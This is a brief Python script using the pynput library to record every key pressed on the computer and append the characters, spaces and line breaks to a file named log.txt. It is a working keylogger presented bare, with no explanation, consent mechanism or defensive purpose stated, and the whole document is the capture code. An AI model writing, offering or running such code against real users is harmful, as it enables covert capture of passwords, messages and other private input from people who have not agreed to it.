from pynput.keyboard import Listener, Key
def write_to_file(key):
    try:
        letter = key.char
    except AttributeError:
        if key == Key.space:
            letter = " "
        elif key == Key.enter:
            letter = "\n"
        else:
            return
    with open("log.txt", "a") as f:
        f.write(letter)
with Listener(on_press=write_to_file) as listener:
    listener.join()